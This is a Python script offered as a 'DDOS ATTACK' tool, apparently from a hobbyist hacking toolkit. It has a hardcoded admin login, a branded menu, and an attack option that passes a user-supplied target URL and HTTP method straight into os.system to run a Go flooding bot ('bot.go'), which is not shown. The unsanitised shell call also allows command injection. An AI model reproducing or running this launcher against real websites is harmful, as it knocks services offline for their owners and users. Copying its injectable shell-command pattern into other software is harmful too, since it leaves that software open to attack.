import os,sys,time
import getpass

#-------------------[]--------------------#
logo = '''
 ______   ______      ___     ______   
|_   _ `.|_   _ `.  .'   `. .' ____ \  
  | | `. \ | | `. \/  .-.  \| (___ \_| 
  | |  | | | |  | || |   | | _.____`.  
 _| |_.' /_| |_.' /\  `-'  /| \____) | 
|______.'|______.'  `.___.'  \______.' 
                                       
                                       '''
line = (55*'\033[1;31m_')
#-------------------[]--------------------#
def clear():
	os.system("clear")
	print(logo)
	print(line)
	
#-------------------[]--------------------#
def menu():
	clear()
	print("\033[1;33m[\033[1;31m??\033[1;33m]  \033[1;37mAuthor      \033[1;31m:  \033[1;32mKobir  Khan")
	print("\033[1;33m[\033[1;31m01\033[1;33m]  \033[1;37mGithub      \033[1;31m:  \033[1;32mXNLN7")
	print("\033[1;33m[\033[1;31m02\033[1;33m]  \033[1;37mTelegram    \033[1;31m:  \033[1;32mXNLN7")
	print("\033[1;33m[\033[1;31m03\033[1;33m]  \033[1;37mTools       \033[1;31m:  \033[1;32mDDOS ATTACK")
	print(line)
	print(" ")
	option = input("\033[1;36m<\033[1;37m/\033[1;36m>  \033[1;32mSelect Option\033[1;33m     ➤    \033[1;37m")
	
	if option in ['1','01']:
		os.system("xdg-open https://github.com/xnln7")
		time.sleep(2)
		menu()
		
	elif option in ['2','02']:
		os.system("xdg-open https://t.me/XNLN7")
		time.sleep(2)
		menu()
		
	elif option in ['3','03']:
		time.sleep(1.5)
		xnln()
		
	else:
		print(f"\033[1;31mSelect    Valut    Option.......")
		time.sleep(2)
		menu()
		
		
#-------------------[]--------------------#
def xnln():
	clear()
	print("\033[1;33mExample [ddos https://example.com GET] ")
	print(" ")
	weburl = input("\033[1;33m  ➤ ")
		
	if 'ddos' in weburl:
		try:
			parts = weburl.split()
			if len(parts) < 3:
				raise ValueError("Invalid input. Please provide input in the format 'ddos https://example.com GET'.")
				
			url = parts[1]
			method = parts[2]
			os.system(f'go run bot.go -site {url} -data {method}')
		except IndexError:
			print('Usage: ddos <url> METHODS<GET/POST>')
			print('Example: ddos http://example.com GET')
			
	else:
		print('Command not found ')
		pass
		
#-------------------[]--------------------#
def login():
	os.system("clear")
	user = "admin"
	password = "xnln7"
	username = input("Username \033[1;33m  ➤ ")
	passwords = getpass.getpass(prompt='⚡ Password: ')
	if username != user or passwords != password:
		time.sleep(1.5)
		print("Wrong Password or username")
		time.sleep(2)
		login()
		
	elif username == user or passwords == password:
		time.sleep(1.5)
		print("Login Successful....")
		time.sleep(2)
		menu()
	
	
#-------------------[]--------------------#
#-------------------[]--------------------#
login()
